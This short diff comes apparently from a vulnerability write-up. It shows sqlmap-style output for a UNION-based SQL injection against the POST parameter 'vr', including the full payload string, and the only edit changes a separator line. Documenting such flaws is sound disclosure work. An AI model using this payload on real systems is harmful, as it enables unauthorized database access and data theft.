@@ -26,7 +26,7 @@ Parameter: vr (POST)
     Type: UNION query
     Title: Generic UNION query (NULL) - 5 columns
     Payload: vr=123321' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171706271,0x614b42746d4946444c726d734d695a52654d4a5676534344787557687076666b756f73726b727155,0x7176626271),NULL-- -&vn=mirage
----
+    
 <img width="1664" alt="image" src="https://github.com/user-attachments/assets/a38374ae-a71a-4ab7-b742-625fcaa963a8">
 
 # Analysis
